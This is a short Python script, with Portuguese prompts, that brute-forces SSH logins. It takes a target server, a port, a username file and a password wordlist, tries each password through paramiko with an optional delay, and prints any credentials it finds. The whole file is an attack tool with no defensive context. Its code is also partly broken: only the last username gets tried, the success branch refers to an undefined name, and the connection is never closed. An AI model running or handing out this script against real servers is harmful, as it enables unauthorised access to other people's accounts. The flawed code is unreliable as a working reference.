#!/usr/bin/python3
import paramiko,sys
from termcolor import colored
from time import *

servidor = input(colored("Digite o servidor: ",'blue')) 
porta = input(colored("digite a porta do serviço ssh: ",'magenta'))
nome = input(colored("Digite o nome do user: ",'yellow'))
wl = input(colored("Digite a wordlist: ",'red'))
t = input(colored("IFORME O TEMPO DE EXECUÇÃO ENTRE CADA REQUISIÇÃO:",'green'))
tempo = int(t)

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f= open(wl)
nomes=open(nome)
for palavra in f.readlines():
	senha = palavra.strip()
	for n in nomes.readlines():
		ns = n.strip() 
	try:
		ssh.connect(servidor,port=porta,username=ns,password=senha)
	except paramiko.ssh_exception.AuthenticationException:
		print (colored("Testando senha:",'red'),ns ,senha)
		
		sleep(tempo)
	else:
		print (colored("[+++]senha encontrada >>>>",green),ns,senha)
		break
ssh.close
